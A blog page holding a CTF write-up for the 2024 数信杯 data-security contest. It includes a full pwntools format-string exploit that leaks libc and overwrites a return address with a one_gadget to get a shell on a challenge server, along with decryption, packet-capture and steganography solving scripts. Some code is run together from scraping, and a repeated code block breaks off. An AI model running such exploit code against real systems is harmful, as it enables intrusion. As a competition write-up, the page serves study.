@@ -1,0 +1,275 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>数据安全大赛 2024 数信杯 东部赛区 | PUDONG LAB</title><meta name="author" content="朴冬,2559874620@qq.com/tyjiang@stu.xjtu.edu.cn"><meta name="copyright" content="朴冬"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="8 道题合集：非栈 fmt string &#x2F; base64 循环移位 &#x2F; RC4+XOR &#x2F; ftp STOR 计数 &#x2F; SQL 流量 &#x2F; 套娃编码 + Arnold">
+<meta property="og:type" content="article">
+<meta property="og:title" content="数据安全大赛 2024 数信杯 东部赛区">
+<meta property="og:url" content="https://pudong617.github.io/2024/01/01/ctf-kb/wp/Pwn/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E6%9A%A8%E9%A6%96%E5%B1%8A-%E6%95%B0%E4%BF%A1%E6%9D%AF-%E4%B8%9C%E9%83%A8%E8%B5%9B%E5%8C%BAwriteup/">
+<meta property="og:site_name" content="PUDONG LAB">
+<meta property="og:description" content="8 道题合集：非栈 fmt string &#x2F; base64 循环移位 &#x2F; RC4+XOR &#x2F; ftp STOR 计数 &#x2F; SQL 流量 &#x2F; 套娃编码 + Arnold">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://pudong617.github.io/img/youli.png">
+<meta property="article:published_time" content="2023-12-31T16:00:00.000Z">
+<meta property="article:modified_time" content="2023-12-31T16:00:00.000Z">
+<meta property="article:author" content="朴冬">
+<meta property="article:tag" content="非栈上格式化字符串">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pudong617.github.io/img/youli.png"><link rel="shortcut icon" href="/img/PU-LOGO.png"><link rel="canonical" href="https://pudong617.github.io/2024/01/01/ctf-kb/wp/Pwn/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E6%9A%A8%E9%A6%96%E5%B1%8A-%E6%95%B0%E4%BF%A1%E6%9D%AF-%E4%B8%9C%E9%83%A8%E8%B5%9B%E5%8C%BAwriteup/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: true,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '数据安全大赛 2024 数信杯 东部赛区',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: false,
+  postUpdate: '2024-01-01 00:00:00'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><style>
+  /* 冷色极光渐变背景：与主题主色 #49B1F5 / #00C4B6 同色系 */
+  html #web_bg {
+    background-color: #F5FAFF;
+    background-image:
+      radial-gradient(1200px 700px at 12% -10%, rgba(73, 177, 245, .55), transparent 60%),
+      radial-gradient(1000px 650px at 92% 15%, rgba(0, 196, 182, .40), transparent 60%),
+      radial-gradient(900px 560px at 68% 108%, rgba(255, 114, 66, .16), transparent 62%),
+      linear-gradient(155deg, #E3F2FF 0%, #F6FBFF 45%, #E4F8F2 100%);
+  }
+  /* 暗色模式：同构图，降低光斑强度 */
+  html[data-theme='dark'] #web_bg {
+    background-color: #0B121A;
+    background-image:
+      radial-gradient(1100px 700px at 10% -8%, rgba(73, 177, 245, .45), transparent 62%),
+      radial-gradient(1000px 620px at 92% 12%, rgba(0, 196, 182, .32), transparent 62%),
+      radial-gradient(800px 520px at 72% 105%, rgba(255, 114, 66, .10), transparent 60%),
+      linear-gradient(160deg, #0B121A 0%, #0C1A24 50%, #0A1E20 100%);
+  }
+</style>
+<link rel="stylesheet" href="/css/custom.css"><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/youli.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">1050</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">879</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">16</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 分享</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> LINK</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background: radial-gradient(1100px 620px at 18% 8%, rgba(73, 177, 245, .55), transparent 60%), radial-gradient(900px 520px at 82% 22%, rgba(0, 196, 182, .45), transparent 62%), radial-gradient(700px 460px at 55% 108%, rgba(255, 114, 66, .18), transparent 60%), linear-gradient(155deg, #0A1A2B 0%, #0E3049 48%, #083F45 100%)"><nav id="nav"><span id="blog-info"><a href="/" title="PUDONG LAB"><img class="site-icon" src="/img/pudong.png"/></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 分享</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> LINK</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">数据安全大赛 2024 数信杯 东部赛区</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-12-31T16:00:00.000Z" title="发表于 2024-01-01 00:00:00">2024-01-01</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-12-31T16:00:00.000Z" title="更新于 2024-01-01 00:00:00">2024-01-01</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF%E7%9F%A5%E8%AF%86%E5%BA%93/">CTF知识库</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF%E7%9F%A5%E8%AF%86%E5%BA%93/WP/">WP</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF%E7%9F%A5%E8%AF%86%E5%BA%93/Pwn/">Pwn</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="数据安全大赛 2024 数信杯 东部赛区"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><blockquote>
+<p>原文: <a target="_blank" rel="noopener" href="https://www.ctfiot.com/173987.html">https://www.ctfiot.com/173987.html</a><br>ID: 173987</p>
+</blockquote>
+<p>数据安全题</p>
+<p>非栈上格式化字符串利用。有多次输入机会，整体思路是利用RBP多级指针改写main函数返回地址为one_gadget。需要改写8个字节，因此可以分两次写入，每次写入一个short长度。</p>
+<p>from pwn import *<br>context.arch &#x3D; ‘amd64’context.log_level &#x3D; ‘debug’context.terminal &#x3D; [‘tmux’, ‘sp’ ,’-h’]<br>#libc &#x3D; ELF(‘.&#x2F;libc-2.23.so’)libc &#x3D; ELF(‘&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6’)<br>#io &#x3D; process(“.&#x2F;pb”)io &#x3D; remote(‘106.15.53.199’,’32829’)<br>payload &#x3D; “%11$p%13$p”io.sendlineafter(“How to do?n”, payload)<br>leak &#x3D; eval(io.recv(14))info(hex(leak))<br>libc_start_main &#x3D; leak - 240info(hex(libc_start_main))<br>libc_base &#x3D; libc_start_main - libc.sym[‘__libc_start_main’]info(hex(libc_base))<br>‘’’0x45226 execve(“&#x2F;bin&#x2F;sh”, rsp+0x30, environ)constraints: rax &#x3D;&#x3D; NULL<br>0x4527a execve(“&#x2F;bin&#x2F;sh”, rsp+0x30, environ)constraints: [rsp+0x30] &#x3D;&#x3D; NULL<br>0xf03a4 execve(“&#x2F;bin&#x2F;sh”, rsp+0x50, environ)constraints: [rsp+0x50] &#x3D;&#x3D; NULL<br>0xf1247 execve(“&#x2F;bin&#x2F;sh”, rsp+0x70, environ)constraints: [rsp+0x70] &#x3D;&#x3D; NULL’’’one_gadget_list &#x3D; [0x45226, 0x4527a, 0xf03a4, 0xf1247]one_gadget &#x3D; libc_base + one_gadget_list[3]info(hex(one_gadget))raw_input()<br>stack_leak_addr &#x3D; eval(io.recv(14))info(hex(stack_leak_addr))<br>ret_addr &#x3D; stack_leak_addr - 256 + 32info(hex(ret_addr))<br>write_in &#x3D; ret_addr &amp; 0xffffnum_len &#x3D; len(str(write_in))payload &#x3D; “%{}c%13$hn”.format(write_in-num_len + 5)io.sendlineafter(“How to do?n”, payload)payload &#x3D; “%{}c%39$hn”.format((one_gadget &amp; 0xffff))io.sendlineafter(“How to do?n”, payload)<br>payload &#x3D; “%{}c%13$hn”.format(write_in - num_len + 7)io.sendlineafter(“How to do?n”, payload)payload &#x3D; “%{}c%39$hn”.format(((one_gadget &gt;&gt; 16) &amp; 0xffff))#gdb.attach(io, “b *0x400779”)io.sendlineafter(“How to do?n”, payload)<br>io.sendlineafter(“How to do?n”, ‘a’*100)<br>io.interactive()</p>
+<p>base64+循环移位简单题，base64甚至没有换表。</p>
+<p>import base64import re<br>with open(‘en_file_data.enf’, ‘rb’) as f: data &#x3D; list(f.read())<br>for i in range(len(data)): data[i] &#x3D; ((data[i] &lt;&lt; 5) &amp; 0xff) | (data[i] &gt;&gt; 3)data &#x3D; bytes(data).decode()b64 &#x3D; re.findall(r’[A-Za-z0-9+&#x2F;]*&#x3D;{0,2}’, data)res &#x3D; b’’for x in b64: if x &#x3D;&#x3D; ‘’: continue x &#x3D; base64.b64decode(x) res +&#x3D; x<br>with open(‘res’, ‘wb’) as f: f.write(res)<br>res_m &#x3D; [x.split(b’ ‘) for x in res.split(b’n’)]print(res_m[12-1][2-1]) # 第12行第2列</p>
+<p>736463199528108971</p>
+<p>re_ds002</p>
+<p>rc4+xor简单题，rc4无魔改，两种算法的key动调可得：</p>
+<p>from arc4 import ARC4<br>with open(‘en_file_data.enf2’, ‘rb’) as f: data &#x3D; f.read().split(b’rn’)k1 &#x3D; b”6A1D4E2a2276Y7JL” # from debuggingk2 &#x3D; b”276Y7JB6A1D4E2A2” # from debugging<br>res &#x3D; b’’for x in data: l &#x3D; list(x) for i in range(len(l)): l[i] ^&#x3D; k2[i%len(k2)] rc4 &#x3D; ARC4(k1) ans &#x3D; rc4.encrypt(bytes(l)) res +&#x3D; ans<br>with open(‘res’, ‘wb’) as f: f.write(res)<br>res_m &#x3D; [x.split(b’ ‘) for x in res.split(b’n’)]print(res_m[8-1][2-1]) # 第8行第2列</p>
+<p>855981200427146647</p>
+<p>数据分析题</p>
+<p>数据分析1</p>
+<p>ftp 过滤一下 可直接看到 admin admin123  账户密码登录成功</p>
+<?phpecho md5('ftp+admin+admin123');flag为:
+458e8dbe703531b99e3381853b3134ef
+
+统计一下STOR 可得知有101个, 特殊文件为key
+
+<?php
+echo md5('101+key');
+flag为:
+717c0890a66bcf9524e87fdccb7d2bf4
+
+从key.txt中可以得到arnold变换的a和b，变换后可以得到一张二维码。
+
+import pyshark
+from PIL import Imageimport numpy as np
+def get_png(): # 导出图片 cap = pyshark.FileCapture('./catcat.pcapng', display_filter="ftp-data") n = 1 for packet in cap: p = packet['TCP'].get_field('payload') if p.startswith("89:50:4e:47"): png = bytes([int(x, 16) for x in p.split(':')]) with open(f'in/{n}.png', 'wb') as f: f.write(png) n += 1 return n
+def tog_png(fn): # 拼接图片 img = np.array(Image.open('in/1.png')) height, width, color = img.shape res_img = np.zeros((height*100, width, color), dtype=int) for x in range(1, 101): img = np.array(Image.open(f"in/{x}.png")) # img = np.array(Image.open(f"output/res_{x}.png")) height, width, color = img.shape for j in range(height): res_img[j+(x-1)*height] = img[j] Image.fromarray(np.uint8(res_img)).save(fn) return
+def arnold(im_file, a, b, fn): img = np.array(Image.open(im_file)) height, width, color = img.shape res_img = np.zeros((height, width, color), dtype=int) for j in range(height): for i in range(width): res_img[((a*b+1)*j-a*i) % height, (-b*j+i) % width] = img[j, i] Image.fromarray(np.uint8(res_img)).save(fn) return
+if __name__ == '__main__': assert get_png() == 100+1 a = 0x6f6c53 b = 0x729e tog_png('res0.png')arnold('res0.png', a, b, 'res1.png')
+
+得到的二维码如下：
+
+扫出来文字说是假flag。
+
+stegsolve查看图片的各颜色通道，可以看到r0、g0、b0通道上方有黑点，说明有lsb。
+
+lsb导出文本：
+
+解套娃编码，Base64 -> Base32 -> unhex依次解密得到flag
+
+import base64
+def get_flag(): # stegsolve导出lsb数据 lsb = "R1kzRE1RWldHRTNET04yQ0dNWlRNTlJUR00zREdNWlJHWVpER05CVEhFWlRLTVpRR00yREdNSlRIRVpUQ05SV0dZWVRNTlJUR1laVEtNWlhHTTNER09CVEdZWlRNTlJXR000VEdPSlRIQVpUQU1aV0dZWlRNTkJYSVE9PT09PT0=" b64 = base64.b64decode(lsb) b32 = base64.b32decode(b64) flag = bytes.fromhex(b32.decode()) print(flag)
+
+flag{3f3c1b49504191faf6576866f99806cd}
+
+数据分析2
+
+运行如下python脚本：
+
+table_log=[……]table_groups=[……]table_users=[……]table_api=[……]for i in range(0,len(table_log)): log=table_log[i] user_id=log[1] method=log[2].split(" ")[5].replace('"',"") api_path=log[2].split(" ")[6] group_id=table_users[user_id-1][-1] methods=table_groups[group_id-1][1] #print(methods) api_paths=table_groups[group_id-1][2] tmp_api_paths=[] for j in api_paths.split(','): tmp_api_paths.append(table_api[int(j)-1][1]) api_paths=str(tmp_api_paths) #print(api_paths) if method not in methods or api_path not in api_paths: for k in table_api: if k[1] in api_path: print(str(user_id)+"_"+str(group_id)+"_"+str(k[0])+"_"+str(i+1))
+
+<?phpecho md5('129_3_92_3223,137_7_16_4436,423_10_26_2667,469_4_3_3917');
+flag为:
+8634fe5ad186b44f9a7e51ac0595a768
+
+数据分析3
+
+<?phpecho md5('admin:
+admin@QWEzxc');flag为:
+95e1da8517497ee29e716a2835375eeb
+
+搜索thekey ,追踪流
+
+<?phpecho md5('webuser:
+1q2w3e4r5t6y');flag为:
+a18b8e2d1a8ee267599b04be62f0a26a
+
+数据分析5
+
+第二小题。观察流量发现是SQL注入，过滤http协议和IP地址，在最后发现shell.php木马文件，连接密码也很明显：
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.arch = &#x27;amd64&#x27;context.log_level = &#x27;debug&#x27;context.terminal = [&#x27;tmux&#x27;, &#x27;sp&#x27; ,&#x27;-h&#x27;]</span><br><span class="line">    #libc = ELF(&#x27;./libc-2.23.so&#x27;)libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span><br><span class="line">    #io = process(&quot;./pb&quot;)io = remote(&#x27;106.15.53.199&#x27;,&#x27;32829&#x27;)</span><br><span class="line">payload = &quot;%11$p%13$p&quot;io.sendlineafter(&quot;How to do?n&quot;, payload)</span><br><span class="line">leak = eval(io.recv(14))info(hex(leak))</span><br><span class="line">libc_start_main = leak - 240info(hex(libc_start_main))</span><br><span class="line">libc_base = libc_start_main - libc.sym[&#x27;__libc_start_main&#x27;]info(hex(libc_base))</span><br><span class="line">&#x27;&#x27;&#x27;0x45226 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)constraints: rax == NULL</span><br><span class="line">0x4527a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)constraints: [rsp+0x30] == NULL</span><br><span class="line">0xf03a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)constraints: [rsp+0x50] == NULL</span><br><span class="line">0xf1247 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)constraints: [rsp+0x70] == NULL&#x27;&#x27;&#x27;one_gadget_list = [0x45226, 0x4527a, 0xf03a4, 0xf1247]one_gadget = libc_base + one_gadget_list[3]info(hex(one_gadget))raw_input()</span><br><span class="line">stack_leak_addr = eval(io.recv(14))info(hex(stack_leak_addr))</span><br><span class="line">ret_addr = stack_leak_addr - 256 + 32info(hex(ret_addr))</span><br><span class="line">write_in = ret_addr &amp; 0xffffnum_len = len(str(write_in))payload = &quot;%&#123;&#125;c%13$hn&quot;.format(write_in-num_len + 5)io.sendlineafter(&quot;How to do?n&quot;, payload)payload = &quot;%&#123;&#125;c%39$hn&quot;.format((one_gadget &amp; 0xffff))io.sendlineafter(&quot;How to do?n&quot;, payload)</span><br><span class="line">payload = &quot;%&#123;&#125;c%13$hn&quot;.format(write_in - num_len + 7)io.sendlineafter(&quot;How to do?n&quot;, payload)payload = &quot;%&#123;&#125;c%39$hn&quot;.format(((one_gadget &gt;&gt; 16) &amp; 0xffff))#gdb.attach(io, &quot;b *0x400779&quot;)io.sendlineafter(&quot;How to do?n&quot;, payload)</span><br><span class="line">io.sendlineafter(&quot;How to do?n&quot;, &#x27;a&#x27;*100)</span><br><span class="line">io.interactive()</span><br><span class="line">import base64import re</span><br><span class="line">with open(&#x27;en_file_data.enf&#x27;, &#x27;rb&#x27;) as f: data = list(f.read())</span><br><span class="line">for i in range(len(data)): data[i] = ((data[i] &lt;&lt; 5) &amp; 0xff) | (data[i] &gt;&gt; 3)data = bytes(data).decode()b64 = re.findall(r&#x27;[A-Za-z0-9+/]*=&#123;0,2&#125;&#x27;, data)res = b&#x27;&#x27;for x in b64: if x == &#x27;&#x27;: continue x = base64.b64decode(x) res += x</span><br><span class="line">with open(&#x27;res&#x27;, &#x27;wb&#x27;) as f: f.write(res)</span><br><span class="line">res_m = [x.split(b&#x27; &#x27;) for x in res.split(b&#x27;n&#x27;)]print(res_m[12-1][2-1]) # 第12行第2列</span><br><span class="line"></span><br><span class="line">736463199528108971</span><br><span class="line">from arc4 import ARC4</span><br><span class="line">with open(&#x27;en_file_data.enf2&#x27;, &#x27;rb&#x27;) as f: data = f.read().split(b&#x27;rn&#x27;)k1 = b&quot;6A1D4E2a2276Y7JL&quot; # from debuggingk2 = b&quot;276Y7JB6A1D4E2A2&quot; # from debugging</span><br><span class="line">res = b&#x27;&#x27;for x in data: l = list(x) for i in range(len(l)): l[i] ^= k2[i%len(k2)] rc4 = ARC4(k1) ans = rc4.encrypt(bytes(l)) res += ans</span><br><span class="line">with open(&#x27;res&#x27;, &#x27;wb&#x27;) as f: f.write(res)</span><br><span class="line">res_m = [x.split(b&#x27; &#x27;) for x in res.split(b&#x27;n&#x27;)]print(res_m[8-1][2-1]) # 第8行第2列</span><br><span class="line"></span><br><span class="line">855981200427146647</span><br><span class="line">&lt;?phpecho md5(&#x27;ftp+admin+admin123&#x27;);flag为:</span><br><span class="line">458e8dbe703531b99e3381853b3134ef</span><br><span class="line">&lt;?php</span><br><span class="line">echo md5(&#x27;101+key&#x27;);</span><br><span class="line">flag为:</span><br><span class="line">717c0890a66bcf9524e87fdccb7d2bf4</span><br><span class="line">import pyshark</span><br><span class="line">from PIL import Imageimport numpy as np</span><br><span class="line">def get_png(): # 导出图片 cap = pyshark.FileCapture(&#x27;./catcat.pcapng&#x27;, display_filter=&quot;ftp-data&quot;) n = 1 for packet in cap: p = packet[&#x27;TCP&#x27;].get_field(&#x27;payload&#x27;) if p.startswith(&quot;89:50:4e:47&quot;): png = bytes([int(x, 16) for x in p.split(&#x27;:&#x27;)]) with open(f&#x27;in/&#123;n&#125;.png&#x27;, &#x27;wb&#x27;) as f: f.write(png) n += 1 return n</span><br><span class="line">def tog_png(fn): # 拼接图片 img = np.array(Image.open(&#x27;in/1.png&#x27;)) height, width, color = img.shape res_img = np.zeros((height*100, width, color), dtype=int) for x in range(1, 101): img = np.array(Image.open(f&quot;in/&#123;x&#125;.png&quot;)) # img = np.array(Image.open(f&quot;output/res_&#123;x&#125;.png&quot;)) height, width, color = img.shape for j in range(height): res_img[j+(x-1)*height] = img[j] Image.fromarray(np.uint8(res_img)).save(fn) return</span><br><span class="line">def arnold(im_file, a, b, fn): img = np.array(Image.open(im_file)) height, width, color = img.shape res_img = np.zeros((height, width, color), dtype=int) for j in range(height): for i in range(width): res_img[((a*b+1)*j-a*i) % height, (-b*j+i) % width] = img[j, i] Image.fromarray(np.uint8(res_img)).save(fn) return</span><br><span class="line">if __name__ == &#x27;__main__&#x27;: assert get_png() == 100+1 a = 0x6f6c53 b = 0x729e tog_png(&#x27;res0.png&#x27;)arnold(&#x27;res0.png&#x27;, a, b, &#x27;res1.png&#x27;)</span><br><span class="line">import base64</span><br><span class="line">def get_flag(): # stegsolve导出lsb数据 lsb = &quot;R1kzRE1RWldHRTNET04yQ0dNWlRNTlJUR00zREdNWlJHWVpER05CVEhFWlRLTVpRR00yREdNSlRIRVpUQ05SV0dZWVRNTlJUR1laVEtNWlhHTTNER09CVEdZWlRNTlJXR000VEdPSlRIQVpUQU1aV0dZWlRNTkJYSVE9PT09PT0=&quot; b64 = base64.b64decode(lsb) b32 = base64.b32decode(b64) flag = bytes.fromhex(b32.decode()) print(flag)</span><br><span class="line"></span><br><span class="line">flag&#123;3f3c1b49504191faf6576866f99806cd&#125;</span><br><span class="line">table_log=[……]table_groups=[……]table_users=[……]table_api=[……]for i in range(0,len(table_log)): log=table_log[i] user_id=log[1] method=log[2].split(&quot; &quot;)[5].replace(&#x27;&quot;&#x27;,&quot;&quot;) api_path=log[2].split(&quot; &quot;)[6] group_id=table_users[user_id-1][-1] methods=table_groups[group_id-1][1] #print(methods) api_paths=table_groups[group_id-1][2] tmp_api_paths=[] for j in api_paths.split(&#x27;,&#x27;): tmp_api_paths.append(table_api[int(j)-1][1]) api_paths=str(tmp_api_paths) #print(api_paths) if method not in methods or api_path not in api_paths: for k in table_api: if k[1] in api_path: print(str(user_id)+&quot;_&quot;+str(group_id)+&quot;_&quot;+str(k[0])+&quot;_&quot;+str(i+1))</span><br><span class="line">&lt;?phpecho md5(&#x27;129_3_92_3223,137_7_16_4436,423_10_26_2667,469_4_3_3917&#x27;);</span><br><span class="line">flag为:</span><br><span class="line">8634fe5ad186b44f9a7e51ac0595a768</span><br><span class="line">&lt;?phpecho md5(&#x27;admin:</span><br><span class="line">admin@QWEzxc&#x27;);flag为:</span><br><span 